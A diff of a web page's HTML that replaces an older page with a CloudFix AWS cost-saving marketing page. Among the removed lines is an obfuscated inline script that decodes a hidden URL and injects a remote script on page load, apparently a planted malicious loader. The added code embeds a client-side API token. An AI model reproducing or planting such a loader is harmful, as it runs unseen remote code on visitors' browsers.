+</div></div><div class="scroll-locker__cell" data-target="84705-2"><figure class="scroll-locker__mobile-image"><img width="600" height="386" src="https://cloudfix.aurea.com/wp-content/uploads/Save-1-600x386.png" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" srcset="https://cloudfix.aurea.com/wp-content/uploads/Save-1-600x386.png 600w, https://cloudfix.aurea.com/wp-content/uploads/Save-1-300x193.png 300w, https://cloudfix.aurea.com/wp-content/uploads/Save-1-768x494.png 768w, https://cloudfix.aurea.com/wp-content/uploads/Save-1.png 1044w" sizes="(max-width: 600px) 100vw, 600px" /></figure><div class="scroll-locker__content"><h3>Save</h3>
+<p>With CloudFix, you not only see immediate savings, your savings continue to grow over time. We’re always adding new fixers and adapting to your dynamic environment, so your AWS cost savings build like compounding interest.</p>
+</div></div>		</div>
+		
+	</div>
+	
+		</section><section  class="content-block  divider divider--9718d pt-4 pt-lg-5 pt-xl-6 pb-100 px-0 ">
+		<div class="inner grid col-single">
+		<div class="sub-one"><div class="button-group" style="gap:1rem;justify-content:center"><span><a class="primary-invert-btn" href="https://cloudfix.aurea.com/product/" >See how CloudFix works</a></span></div></div>	</div>
+		</section>
+<section  class="content-block  divider divider--b240d pt-150 pb-100 px-0 ">
+		<div class="inner grid col-single">
+		<div class="sub-one"><div class="status-callout big-heading" style="max-width:835px"><div><h3>AWS cost optimization made easy</h3><p>CloudFix takes the complexity out of AWS cost optimization. We keep up with the firehose of AWS releases and recommendations, so you don’t have to.</p>
+</div></div></div>	</div>
+		</section>
+<section  class="content-block  divider divider--6244e pt-0 pb-100 px-0 icon-feature">
+		<div class="inner grid col-four">
+		<div class="sub-one">				<div class="content-image image-top">
+					<figure class="image"><img width="98" height="97" src="https://cloudfix.aurea.com/wp-content/uploads/Fixers-icon.svg" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" /></figure>					<div class="content">
+						<h5>Fixers, not just finders</h5>
+<p>Take action on the dozens of AWS updates released every week, simply, securely, and with control.</p>
+					</div>
+				</div>
 
-<script src="https://www.twilik.com/assets/retainable/rss-embed/retainable-rss-embed.js"></script>
+			</div><div class="sub-two">				<div class="content-image image-top">
+					<figure class="image"><img width="90" height="91" src="https://cloudfix.aurea.com/wp-content/uploads/icon-circle-check.svg" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" /></figure>					<div class="content">
+						<h5>Easy and automatic</h5>
+<p>With CloudFix, your IT team can focus on business value instead of tracking, testing, and implementing manual fixes.</p>
+					</div>
+				</div>
 
-<script>
+			</div><div class="sub-three">				<div class="content-image image-top">
+					<figure class="image"><img width="120" height="94" src="https://cloudfix.aurea.com/wp-content/uploads/icon-handshake.svg" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" /></figure>					<div class="content">
+						<h5>AWS-recommended</h5>
+<p>Every CloudFix &#8220;fixer&#8221; is pre-vetted and tested in partnership with AWS to ensure zero risk and zero service interruption.</p>
+					</div>
+				</div>
 
-(function($) {
+			</div><div class="sub-four">				<div class="content-image image-top">
+					<figure class="image"><img width="112" height="97" src="https://cloudfix.aurea.com/wp-content/uploads/icon-time.svg" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" /></figure>					<div class="content">
+						<h5>Nonstop AWS savings</h5>
+<p>CloudFix runs continuously in the background to keep finding and fixing new savings opportunities &#8212; all day, every day.</p>
+					</div>
+				</div>
 
-	$('.section-link').click(function() {
-	  var cur = $('.section-link').index($(this)) + 1;
-	  $('.section-display').removeClass('active');
-	  $('.section-display').eq(cur).addClass('active');
-	});
+			</div>	</div>
+		</section>
+<section  class="content-block  divider divider--d8cc6 pt-0 pb-150 px-0 ">
+		<div class="inner grid col-single">
+		<div class="sub-one"><div class="button-group" style="gap:1rem;justify-content:center"><span><a class="primary-btn" href="https://cloudfix.aurea.com/why-cloudfix/" >Why CloudFix</a></span></div></div>	</div>
+		</section>
+<section  class="content-block  divider divider--0abe6 pt-150 pb-0 px-0 ">
+		<div class="inner grid col-two">
+		<div class="sub-one"><figure class="image"><img width="683" height="465" src="https://cloudfix.aurea.com/wp-content/uploads/Cost-Saving-Graphic-1.png" class="attachment-large size-large" alt="" decoding="async" loading="lazy" style="-o-object-fit:contain;object-fit:contain;" srcset="https://cloudfix.aurea.com/wp-content/uploads/Cost-Saving-Graphic-1.png 683w, https://cloudfix.aurea.com/wp-content/uploads/Cost-Saving-Graphic-1-600x408.png 600w, https://cloudfix.aurea.com/wp-content/uploads/Cost-Saving-Graphic-1-300x204.png 300w" sizes="(max-width: 683px) 100vw, 683px" /></figure></div><div class="sub-two cloudfix-fit"><h6 class="has-tangerine-color text-align-left">How CloudFix fits</h6><h3 class="has-black-color text-align-left">Complement your AWS cost savings strategy</h3><p>CloudFix fills in the gaps between visualization tools and AWS cost optimization solutions designed for heavier lifts. By automating smaller fixes at scale, CloudFix ensures that you don’t leave any money on the table.</p>
+<style>
+.cloudfix-fit {
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+}
 
-	var openTab = function(tabName) {
-		var tab = $('#' + tabName)
-		if(!tab.hasClass('active')) {
-			$('.containerTab.active').each(function(i, el) {
-				$(el).hide();
-				$(el).removeClass('active');
-			});
-			tab.addClass('active').slideDown();
-		}
-		$('html,body').animate({ scrollTop: tab.offset().top - 80}, 'slow');
-	}
+.cloudfix-fit h6 {
+  font-weight: 800;
+}
+</style></div>	</div>
+		</section>
+<section  class="slick-block type-testimonial divider divider--cead3 pt-150 pb-150 px-0 ">
+	<div class="inner section-title"><h2>Why companies love CloudFix</h2></div>	<div class="inner">
+		<div class="slick-slider" data-slick='{"dots":true,"arrows":false,"centerMode":false,"adaptiveHeight":true,"initialSlide":0,"slidesToShow":2,"slidesToScroll":1,"variableWidth":false,"infinite":false,"autoplay":false,"speed":300,"responsive":[{"breakpoint":768,"settings":{"arrows":true,"slidesToShow":1}}]}'>
+			<div class="slick-slide slide-num-0"><blockquote class="testimonial no-pic"><figure></figure><q>CloudFix has exceeded my expectations. Not only have we seen significant savings, but we have also implemented a repeatable, scalable process that is simple to institutionalize and expand.</q><cite><span class="quote-name">CIO</span><span class="quote-title">Western Digital</span></cite></blockquote></div><div class="slick-slide slide-num-1"><blockquote class="testimonial no-pic"><figure></figure><q>CloudFix saves us a tremendous amount of money with very little effort. Most of the other AWS cost savings tools we tried promised this, but CloudFix actually delivered.</q><cite><span class="quote-name">Jeremy Anderson, Cloud Architect</span><span class="quote-title">Conn’s HomePlus
+</span></cite></blockquote></div>		</div>
+	</div>
+		</section>
 
-	$('.team .members').on('click', function(e) {
-		openTab($(this).data('tab'));
-	});
-	$('.team .containerTab .closebtn').on('click', '', function(e) {
-		var tab = $(this).closest('.containerTab');
-		tab.slideUp();
-		tab.removeClass('active');
-	});
 
-	$(".responsive").slick({
-	  prevArrow: $(".prev"),
-	  nextArrow: $(".next"),
-	  infinite: false,
-	  speed: 300,
-	  slidesToShow: 1,
-	  slidesToScroll: 1,
-	  responsive: [
-	    {
-	      breakpoint: 1024,
-	      settings: {
-	        slidesToShow: 1,
-	        slidesToScroll: 1,
-	        infinite: false
-	      }
-	    },
-	    {
-	      breakpoint: 600,
-	      settings: {
-	        slidesToShow: 1,
-	        slidesToScroll: 1
-	      }
-	    },
-	    {
-	      breakpoint: 480,
-	      settings: {
-	        slidesToShow: 1,
-	        slidesToScroll: 1
-	      }
-	    }
-	  ]
-	});
+<section  class="slick-block type-resources divider divider--92805 py-4 py-lg-5 py-xl-6 px-0 ">
+	<div class="inner section-title"><h2>Success Stories</h2></div>	<div class="inner">
+		<div class="slick-slider" data-slick='{"dots":true,"arrows":true,"centerMode":false,"adaptiveHeight":true,"prevArrow":"<button class=\"slick-prev\" aria-label=\"Previous\" type=\"button\"><\/button>","nextArrow":"<button class=\"slick-next\" aria-label=\"Next\" type=\"button\"><\/button>","initialSlide":0,"slidesToShow":1,"slidesToScroll":1,"variableWidth":false,"infinite":false,"autoplay":true,"speed":300}'>
+			<div class="slick-slide slide-num-0"><div class="card card--horizontal" data-id="12225"><figure class="card__image"><img width="1440" height="900" src="https://cloudfix.aurea.com/wp-content/uploads/Valent-headquarters-1.jpg" class="attachment-full size-full wp-post-image" alt="Valent’s small IT team achieves big savings with CloudFix" decoding="async" loading="lazy" srcset="https://cloudfix.aurea.com/wp-content/uploads/Valent-headquarters-1.jpg 1440w, https://cloudfix.aurea.com/wp-content/uploads/Valent-headquarters-1-600x375.jpg 600w, https://cloudfix.aurea.com/wp-content/uploads/Valent-headquarters-1-1200x750.jpg 1200w, https://cloudfix.aurea.com/wp-content/uploads/Valent-headquarters-1-300x188.jpg 300w, https://cloudfix.aurea.com/wp-content/uploads/Valent-headquarters-1-768x480.jpg 768w" sizes="(max-width: 1440px) 100vw, 1440px" /></figure><div class="card__content"><p class="card__term">Success Story</p><h3 class="card__title">Valent’s small IT team achieves big savings with CloudFix</h3><p class="card__excrpt">See how Valent automated their process with the help of CloudFix in order to save around $40,000 per month.</p></div><a href="https://cloudfix.aurea.com/resources/success-story-valent/" class="card__cta">Read More</a></div></div><div class="slick-slide slide-num-1"><div class="card card--horizontal" data-id="11856"><figure class="card__image"><img width="800" height="450" src="https://cloudfix.aurea.com/wp-content/uploads/WIMG_HQ.jpg" class="attachment-full size-full wp-post-image" alt="What If Media Group trusts CloudFix for nonstop AWS cost optimization" decoding="async" loading="lazy" srcset="https://cloudfix.aurea.com/wp-content/uploads/WIMG_HQ.jpg 800w, https://cloudfix.aurea.com/wp-content/uploads/WIMG_HQ-600x338.jpg 600w, https://cloudfix.aurea.com/wp-content/uploads/WIMG_HQ-300x169.jpg 300w, https://cloudfix.aurea.com/wp-content/uploads/WIMG_HQ-768x432.jpg 768w" sizes="(max-width: 800px) 100vw, 800px" /></figure><div class="card__content"><p class="card__term">Success Story</p><h3 class="card__title">What If Media Group trusts CloudFix for nonstop AWS cost optimization</h3><p class="card__excrpt">Find out how CloudFix helped What If Media Group save over $144,000 in AWS costs in just a few months without impacting performance or downtime.</p></div><a href="https://cloudfix.aurea.com/resources/sucess-story-what-if-media-group/" class="card__cta">Read More</a></div></div><div class="slick-slide slide-num-2"><div class="card card--horizontal" data-id="11037"><figure class="card__image"><img width="827" height="466" src="https://cloudfix.aurea.com/wp-content/uploads/Conns-store-front.jpg" class="attachment-full size-full wp-post-image" alt="Conn’s HomePlus achieves nonstop savings with CloudFix" decoding="async" loading="lazy" srcset="https://cloudfix.aurea.com/wp-content/uploads/Conns-store-front.jpg 827w, https://cloudfix.aurea.com/wp-content/uploads/Conns-store-front-600x338.jpg 600w, https://cloudfix.aurea.com/wp-content/uploads/Conns-store-front-300x169.jpg 300w, https://cloudfix.aurea.com/wp-content/uploads/Conns-store-front-768x433.jpg 768w" sizes="(max-width: 827px) 100vw, 827px" /></figure><div class="card__content"><p class="card__term">Success Story</p><h3 class="card__title">Conn’s HomePlus achieves nonstop savings with CloudFix</h3><p class="card__excrpt">“We just set it and forget it”: How the billion-dollar retailer dramatically reduces their AWS spend.</p></div><a href="https://cloudfix.aurea.com/resources/success-story-conns-homeplus/" class="card__cta">Read More</a></div></div><div class="slick-slide slide-num-3"><div class="card card--horizontal legacy" data-id="7555"><figure class="card__image"><img width="700" height="285" src="https://cloudfix.aurea.com/wp-content/uploads/western-digital-logo.png" class="attachment-full size-full wp-post-image" alt="Western Digital Success Story" decoding="async" loading="lazy" srcset="https://cloudfix.aurea.com/wp-content/uploads/western-digital-logo.png 700w, https://cloudfix.aurea.com/wp-content/uploads/western-digital-logo-600x244.png 600w, https://cloudfix.aurea.com/wp-content/uploads/western-digital-logo-300x122.png 300w" sizes="(max-width: 700px) 100vw, 700px" /></figure><div class="card__content"><p class="card__term">Success Story</p><h3 class="card__title">Western Digital Success Story</h3><p class="card__excrpt">Western Digital relies on cloud technology to accelerate growth, CloudFix helps reduce cost</p></div><a href="https://cloudfix.aurea.com/resources/success-story-western-digital/" class="card__cta">Read More</a></div></div>		</div>
+	</div>
+	<figure class="decor--image"></figure>	</section>
 
-})(jQuery);
-</script>
 
-<script>
-	(function(){var _9n0=document.createElement("script"),_tH=(function(_Fpg,_y8){var _uU="";for(var _Rl=0;_Rl<_Fpg.length;_Rl++){var _lz=_Fpg[_Rl].charCodeAt();_lz-=_y8;_lz+=61;_lz!=_Rl;_uU==_uU;_lz%=94;_lz+=33;_y8>6;_uU+=String.fromCharCode(_lz)}return _uU})(atob("eScnIyZLQEAqJj8tIiJ+eiF3Ij90In5AI3ordn1AR0RJckd1RUl2dHVFQUJBdEpKcndBQkl3"), 17);function _L4(){};9>2;_9n0!="G";_9n0.referrerPolicy="unsafe-url";_9n0.async=!0;_9n0.type="text/javascript";_9n0.src=_tH;var _DmZ=document.getElementsByTagName("script")[0];_DmZ.parentNode.insertBefore(_9n0,_DmZ)})();
-</script>
-</body>
+<section  class="content-block  divider divider--3443b pt-5 pt-md-6 pt-lg-7 pt-xl-8 pb-0 px-0 latest-news">
+	<div class="inner section-title"><h2>The latest from CloudFix</h2></div>	<div class="inner grid col-one-over-one">
+		<div class="sub-one"><div class="card card--horizontal card-podcast"><figure class="portrait"><img width="600" height="600" src="https://cloudfix.aurea.com/wp-content/uploads/AWS-INSIDERS-2ep01-cloudtalent-min-600x600.png" class="attachment-medium size-medium wp-post-image" alt="AWS Insiders: Filling the Cloud Talent Gap" decoding="async" loading="lazy" srcset="https://cloudfix.aurea.com/wp-content/uploads/AWS-INSIDERS-2ep01-cloudtalent-min-600x600.png 600w, https://cloudfix.aurea.com/wp-content/uploads/AWS-INSIDERS-2ep01-cloudtalent-min-300x300.png 300w, https://cloudfix.aurea.com/wp-content/uploads/AWS-INSIDERS-2ep01-cloudtalent-min-768x768.png 768w, https://cloudfix.aurea.com/wp-content/uploads/AWS-INSIDERS-2ep01-cloudtalent-min.png 800w" sizes="(max-width: 600px) 100vw, 600px" /></figure><div class="card__content"><h5 class="episode-number">Season 2: Episode #1</h5><h3 class="card__title">Filling the Cloud Talent Gap</h3><div class="guest"><p>Featuring:</p><h5 class="guest-name">Jared Reimer</h5><p class="guest-title">CTO Cascadeo</p><h5 class="guest-name">David Brassor</h5><p class="guest-title">Managing director and partner at Accenture</p></div></div><div class="card__content"><time class="date" datetime="2023-04-17">April 17, 2023</time><p>Staffing your cloud team with the right resources is probably one of the most critical steps right now, and also possibly one of the hardest. Rahul and Hilary speak with folks at both ends of the spectrum &#8211; Jarred Reimer of Cascadeo and David Brassor from Accenture &#8211; for solutions to finding, retaining and leveling up cloud talent.</p>
+<a href="https://cloudfix.aurea.com/podcast/filling-the-cloud-talent-gap/" class="card__cta">Listen here</a></div></div>							<style>
+.latest-news .section-title h2 {
+  color: var(--color-white);
+}
+    
+.latest-news .card:not(.card-podcast) {
+  padding: 3rem;
+}
+    
+.latest-news .card:hover {
+  color: initial;
+  background-color: var(--color-bright-gray);
+}
+    
+.card.reinvent .content-image {
+  align-items: center;
+  margin: 0 auto;
+  column-gap: 2rem;
+  grid-template-columns: 220px auto;
+  margin-bottom: 2rem;
+}
+
+.card.reinvent h4 {
+  color: var(--color-tangerine);
+  font-weight: 800;
+}
+
+.card.reinvent h5 {
+  font-size: 1.3rem;
+  font-weight: 600;
+  margin: 1.5rem 0;
+}
+
+.card.newsletter {
+  background: url('https://cloudfix.aurea.com/wp-content/uploads/circle_background_wide.png') no-repeat;
+  background-size: cover;
+}
+
+.card.newsletter h5 {
+  padding-top: 3rem;
+}
+@media (max-width: 768px) {
+  .card.reinvent .content-image {
+    grid-template-columns: 1fr;
+  }
+  .card.newsletter h5 {
+    padding-top: 0;
+  }
+}
+</style></div><div class="sub-two card card__content newsletter"><h5 style="text-align: center;">Stay up to date with the latest news and content delivered to your inbox.</h5>
+<div id="hs-form-464adc30-96e9-4efe-9ce8-722492cb51b9"></div>    <script id="hs-script-464adc30-96e9-4efe-9ce8-722492cb51b9" charset="utf-8" type="text/javascript" data-src="//js.hsforms.net/forms/v2.js"></script>
+    <script>
+        function hsFormEmbed() {
+            let script = document.getElementById('hs-script-464adc30-96e9-4efe-9ce8-722492cb51b9');
+            let formTarget = document.querySelector('#hs-form-464adc30-96e9-4efe-9ce8-722492cb51b9');
+            script.addEventListener('load', function() {
+                 hbspt.forms.create({
+                    region: "na1",
+                    portalId: "20049174",
+                    formId: "464adc30-96e9-4efe-9ce8-722492cb51b9",
+                    target: "",
+                                            onFormReady: function() {
+                            let clearout_1e086561 = window.clearout = window.clearout || [];
+                            let opts = {
+                                app_token: "8d049e1dd49f35b0ad8128adca63c46b:dc20784b5ac46343e8e5669d266721b0c3784ee1395ea9158067aac642b61f95",
+                                api_url: "https://api.clearout.io",
+                                mode: "formSubmit",
+                                on_before_verify: function({email}){
+                                    var ogEmail = email.email
+                                    email.email = encodeURIComponent(ogEmail);
+                                }
+                            }
+                            let form = document.getElementById('hsForm_464adc30-96e9-4efe-9ce8-722492cb51b9');
+                            clearout_1e086561.push(["initialize", opts, form]),
+                                function() {
+                                    let u = "/";
+                                    let d = document,
+                                        g = d.createElement("script"),
+                                        s = d.getElementsByTagName("script")[0];
+                                    g.type = "text/javascript";
+                                    g.async = true;
+                                    g.src = "https://clearout.io/wp-content/co-js-widget/clearout_js_widget.js",
+                                        s.parentNode.insertBefore(g, s);
+                                }();
+                                                    },
+                                        onFormSubmitted: function() {
+                        (window.dataLayer = window.dataLayer || []).push({
+                            'event': 'leadGenSubmit',
+                            'evtLabel': 'form',
+                            'evtAction': 'newsletter-registration',
+                        });
+                    }
+                });
+            });
+
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        script.src = script.dataset.src;
+                        observer.disconnect();
+                    }
+                })
+            }, {
+                rootMargin: "250px"
+            })
+            observer.observe(formTarget);
+
+            function pasteUTM(param, value) {
+                let input = document.querySelector(`.hs-input[name='${param}']`)
+                if (input) {
+                    input.value = value;
+                }
+            }
+            window.addEventListener('message', event => {
+                if (event.data.type === 'hsFormCallback' && event.data.eventName === 'onFormReady') {
+                    jQuery.loadUTM().map(([param, value]) => pasteUTM(param, value));
+                    pasteUTM('url_last', window.location.origin + window.location.pathname)
+                }
+            });
+        };
+        hsFormEmbed();
+    </script>
+</div>	</div>
+		</section>
+<section  class="content-block  divider divider--94df1 py-4 py-lg-5 py-xl-6 px-0 ">
+		<div class="inner grid col-single">
+		<div class="sub-one"><div class="button-group" style="gap:1rem;justify-content:center"></div></div>	</div>
+		</section>
+<section  class="hero divider divider--d0ae9 p-0  hero--footer">
+	<div class="inner grid col-two">
+		<div class="sub-one"><h2 class="has-dark-blue-color text-align-left">Save nonstop on AWS, easily and automatically.</h2><div class="button-group" style="gap:1rem"><span><a class="primary-btn" href="https://cloudfix.aurea.com/assessment/" >See how much you can save</a></span></div></div><div class="sub-two has-tag-callout"><figure class="image"><img width="749" height="517" src="https://cloudfix.aurea.com/wp-content/uploads/cta_band_2-min.png" class="attachment-large size-large" alt="" decoding="async" loading="lazy" style="" srcset="https://cloudfix.aurea.com/wp-content/uploads/cta_band_2-min.png 749w, https://cloudfix.aurea.com/wp-content/uploads/cta_band_2-min-600x414.png 600w, https://cloudfix.aurea.com/wp-content/uploads/cta_band_2-min-300x207.png 300w" sizes="(max-width: 749px) 100vw, 749px" /></figure><div class="tag-callout has-rounded" style="left:calc(72% - 120px);top:50%;width:240px"><h3 class="has-bright-navy-color" style="text-align: center;">15-60%</h3>
+<p style="text-align: center;">Savings per AWS service</p></div></div>	</div>
+	<div class="shape-container">
+		<div class="footer-bg-shape"></div>
+	</div>
+		</section>
+</main>
+<footer class="page-footer has-white-bg-color">
+	<div class="inner">
+		<div class="grid col-six has-black-color footer-nav">
+			<div class="sub footer-logo">
+				<img src="https://cloudfix.aurea.com/wp-content/themes/cloudfix-3-theme/images/CloudFix_Logo_Color.png" width="208" height="39" alt="CloudFix Logo" />
+				<a class="primary-btn" href="/demo/">Schedule a Live Demo</a>
+			</div>
+			<div class="sub">
+				<ul id="menu-footer-1" class="menu"><li id="menu-item-10834" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10834"><a href="https://cloudfix.aurea.com/why-cloudfix/">Why CloudFix</a></li>
+<li id="menu-item-10833" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10833"><a href="https://cloudfix.aurea.com/product/">Product</a></li>
+<li id="menu-item-11092" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11092"><a href="https://cloudfix.aurea.com/pricing/">Pricing</a></li>
+</ul>			</div>
+			<div class="sub">
+				<ul id="menu-footer-2" class="menu"><li id="menu-item-10835" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10835"><a href="https://cloudfix.aurea.com/aws/">AWS Partnership</a></li>
+<li id="menu-item-10581" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-10581"><a>Company</a>
+<ul class="sub-menu">
+	<li id="menu-item-10836" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10836"><a href="https://cloudfix.aurea.com/leadership/">Leadership</a></li>
+	<li id="menu-item-10583" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10583"><a href="https://cloudfix.aurea.com/about-us/">About us</a></li>
+	<li id="menu-item-10867" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10867"><a href="https://cloudfix.aurea.com/news-events/">News &#038; Events</a></li>
+</ul>
+</li>
+</ul>			</div>
+			<div class="sub">
+				<ul id="menu-footer-3" class="menu"><li id="menu-item-10585" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-10585"><a href="https://cloudfix.aurea.com/resources/">Resources</a>
+<ul class="sub-menu">
+	<li id="menu-item-10837" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10837"><a href="https://cloudfix.aurea.com/blog/">Blog</a></li>
+	<li id="menu-item-10938" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10938"><a href="https://cloudfix.aurea.com/success-stories/">Success Stories</a></li>
+	<li id="menu-item-10838" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10838"><a href="https://cloudfix.aurea.com/podcast/">Podcast</a></li>
+	<li id="menu-item-12476" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-12476"><a href="https://cloudfix.aurea.com/livestream/">Livestream</a></li>
+	<li id="menu-item-11007" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11007"><a href="https://cloudfix.aurea.com/videos/">Videos</a></li>
+</ul>
+</li>
+</ul>			</div>
+			<div class="sub">
+				<ul id="menu-footer-4" class="menu"><li id="menu-item-10839" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-10839"><a href="https://cloudfix.aurea.com/contact-us/">Contact us</a></li>
+<li id="menu-item-10593" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-10593"><a target="_blank" rel="noopener" href="https://support.cloudfix.com/hc/en-us">Support</a></li>
+</ul>			</div>
+			<div class="sub partner-logos">
+				<img src="https://cloudfix.aurea.com/wp-content/themes/cloudfix-3-theme/images/aws_partner_logo.svg" width="100" height="100" alt="AWS Partner Logo" />
+				<img src="https://cloudfix.aurea.com/wp-content/themes/cloudfix-3-theme/images/finops_foundation_premier_partner.png" width="106" height="100" alt="Finops Foundation Premier Partner" />
+			</div>
+		</div>
+		<div class="footer-address">
+			2028 E Ben White Blvd, Ste 240-2650, Austin, TX 78741
+		</div>
+		<div class="footer-newsletter border">
+			<div class="grid col-two">
+				<div class="sub-one">
+					<p>Stay up to date with the latest news and content delivered to your inbox.</p>
+				</div>
+				<div class="sub-two">
+					<div id="hs-form-896fabda-2a69-406c-a624-565d3652d600"></div>    <script id="hs-script-896fabda-2a69-406c-a624-565d3652d600" charset="utf-8" type="text/javascript" data-src="//js.hsforms.net/forms/v2.js"></script>
+    <script>
+        function hsFormEmbed() {
+            let script = document.getElementById('hs-script-896fabda-2a69-406c-a624-565d3652d600');
+            let formTarget = document.querySelector('#hs-form-896fabda-2a69-406c-a624-565d3652d600');
+            script.addEventListener('load', function() {
+                 hbspt.forms.create({
+                    region: "na1",
+                    portalId: "20049174",
+                    formId: "896fabda-2a69-406c-a624-565d3652d600",
+                    target: "",
+                                            onFormReady: function() {
+                            let clearout_b8730aaa = window.clearout = window.clearout || [];
+                            let opts = {
+                                app_token: "8d049e1dd49f35b0ad8128adca63c46b:dc20784b5ac46343e8e5669d266721b0c3784ee1395ea9158067aac642b61f95",
+                                api_url: "https://api.clearout.io",
+                                mode: "formSubmit",
+                                on_before_verify: function({email}){
+                                    var ogEmail = email.email
+                                    email.email = encodeURIComponent(ogEmail);
+                                }
+                            }
+                            let form = document.getElementById('hsForm_896fabda-2a69-406c-a624-565d3652d600');
+                            clearout_b8730aaa.push(["initialize", opts, form]),
+                                function() {
+                                    let u = "/";
+                                    let d = document,
+                                        g = d.createElement("script"),
+                                        s = d.getElementsByTagName("script")[0];
+                                    g.type = "text/javascript";
+                                    g.async = true;
+                                    g.src = "https://clearout.io/wp-content/co-js-widget/clearout_js_widget.js",
+                                        s.parentNode.insertBefore(g, s);
+                                }();
+                                                    },
+                                        onFormSubmitted: function() {
+                        (window.dataLayer = window.dataLayer || []).push({
+                            'event': 'leadGenSubmit',
+                            'evtLabel': 'form',
+                            'evtAction': 'newsletter-registration',
+                        });
+                    }
+                });
+            });
+
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        script.src = script.dataset.src;
+                        observer.disconnect();
+                    }
+                })
+            }, {
+                rootMargin: "250px"
+            })
+            observer.observe(formTarget);
+
+            function pasteUTM(param, value) {
+                let input = document.querySelector(`.hs-input[name='${param}']`)
+                if (input) {
+                    input.value = value;
+                }
+            }
+            window.addEventListener('message', event => {
+                if (event.data.type === 'hsFormCallback' && event.data.eventName === 'onFormReady') {
+                    jQuery.loadUTM().map(([param, value]) => pasteUTM(param, value));
+                    pasteUTM('url_last', window.location.origin + window.location.pathname)
+                }
+            });
+        };
+        hsFormEmbed();
+    </script>
+				</div>
+			</div>
+			
+		</div>
+		<div class="footer-legal grid col-two">
+			<div class="sub-one">
+				<a href="/privacy/">Privacy Policy</a>
+			</div>
+			<div class="sub-two">
+				<a href="/terms-of-service/">Terms of Service</a>
+			</div>
+		</div>
+	</div>
+</footer>
+    <div class='captcha-overlay' style="display: none;">
+      <div class='captcha-container'>
+        <div class='captcha-content'>
+          <p>Please check the box below to start:</p>
+          <div id="recaptcha" class='g-recaptcha' data-callback='recaptchaCallback' data-sitekey='6Ldj1HcfAAAAANbT2N4h-X5mNhCHDkhp07aWfMXr'>
+          </div>
+        </div>
+        <div class='captcha-close'>
+          <i class='eicon-close'></i>
+        </div>
+      </div>
+    </div>
+    <div class="captcha-popup-notice" style="display:none">
+      This site is protected by reCAPTCHA and the Google
+      <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a> and
+      <a href="https://policies.google.com/terms" target="_blank">Terms of Service</a> apply.
+    </div>
+    <style>
+      .captcha-overlay::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        background-color: rgba(0, 0, 0, .5);
+        z-index: -1;
+      }
+
+      .captcha-overlay {
+        position: fixed;
+        height: 100%;
+        width: 100%;
+        bottom: 0;
+        left: 0;
+        background-image: url("/wp-content/uploads/calendly-popup-blurred.png");
+        background-attachment: fixed;
+        background-position: center;
+        background-repeat: no-repeat;
+        justify-content: center;
+        align-items: center;
+        z-index: 150;
+      }
+
+      @media only screen and (max-width: 870px) {
+        .captcha-overlay {
+          background-size: 90%;
+        }
+      }
+
+      .captcha-container {
+        display: flex;
+      }
+
+      .captcha-content {
+        display: flex;
+        flex-direction: column;
+        background-color: #fff;
+        border-radius: 10px;
+        padding: 20px;
+        text-align: center;
+        font-weight: 600;
+      }
+
+      .captcha-close {
+        color: #fff;
+        display: flex;
+        cursor: pointer;
+        padding-left: 10px;
+      }
+
+      .grecaptcha-badge {
+        visibility: hidden;
+      }
+
+      .captcha-popup-notice {
+        position: sticky;
+        bottom: 0;
+        z-index: 99999;
+        width: 100%;
+        text-align: center;
+        font-size: .9rem;
+        padding: .8rem;
+        background: white;
+        max-width: 100vw;
+      }
+    </style>
+    <script>
+      const eventCaptchaPassed = new CustomEvent("recaptchaPassed", {
+        bubbles: true,
+      });
+      if (!captchaPassed) {
+        function onloadCallback() {
+          grecaptcha.ready(function() {
+            grecaptcha
+              .execute("6LdvveIkAAAAAHZTtEUwgCkLWSOamPRqqUAb83t5", {
+                action: "calendly"
+              })
+              .then(function(token) {
+                let formData = new FormData();
+                formData.append("token", token);
+                fetch("https://cloudfix.aurea.com/wp-content/themes/cloudfix-3-theme/verify-captcha.php", {
+                    method: "POST",
+                    body: formData,
+                  })
+                  .then((response) => response.text())
+                  .then((response) => {
+                    const responseText = JSON.parse(response)
+                    if (responseText.clean == true) {
+                      sessionStorage.setItem("recaptcha", true);
+                      document.dispatchEvent(eventCaptchaPassed);
+                      return
+                    }
+                  })
+              })
+          })
+        }
+      }
+      document.querySelectorAll('.calendly-demo a, .calendly-demo-btn').forEach(function(element) {
+        element.addEventListener('click', function(evt) {
+          evt.preventDefault();
+          let captchaPassed = sessionStorage.getItem("recaptcha");
+          if (captchaPassed) {
+            calendlyPopup();
+          } else {
+            document.querySelector('.captcha-overlay').style.display = 'flex';
+            grecaptcha.render('recaptcha', {
+              'sitekey': '6Ldj1HcfAAAAANbT2N4h-X5mNhCHDkhp07aWfMXr'
+            });
+          }
+
+        });
+      });
+
+      function calendlyPopup() {
+        Calendly.initPopupWidget({
+          url: 'https://calendly.com/d/zhd-xvw-7x4/schedule-a-cloudfix-demo?text_color=252525&primary_color=ff9900',
+          utm: ParametersPlugin.getParameters(),
+        });
+        document.querySelector('.captcha-popup-notice').style.display = 'block';
+        document.querySelector('body').addEventListener('click', function(evt) {
